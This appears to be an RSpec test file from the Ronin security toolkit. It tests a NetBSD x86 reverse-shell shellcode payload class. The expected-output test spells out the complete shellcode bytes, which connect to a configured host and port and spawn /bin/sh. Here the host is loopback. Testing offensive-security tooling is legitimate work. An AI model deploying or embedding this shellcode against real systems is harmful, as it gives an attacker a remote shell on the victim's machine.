# encoding: US-ASCII

require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/netbsd/x86/reverse_shell'

describe Ronin::Payloads::Shellcode::NetBSD::X86::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/netbsd/x86/reverse_shell'" do
      expect(subject.id).to eq('shellcode/netbsd/x86/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :netbsd" do
      expect(subject.os).to be(:netbsd)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    let(:negated_ipv4) { "\x80\xff\xff\xfe" }
    let(:negated_port) { "\xfa\xc6" }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc0\x31\xc9\x50\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x89\xc3\x89\xe2\x49\x51\x51\x41\x68#{negated_ipv4}\x68\xff\xfd#{negated_port}\xb1\x10\x51\xf6\x12\x4a\xe2\xfb\xf6\x12\x52\x50\x50\xb0\x62\xcd\x80\xb1\x03\x49\x51\x41\x53\x50\xb0\x5a\xcd\x80\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x50\xb0\x3b\xcd\x80"
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
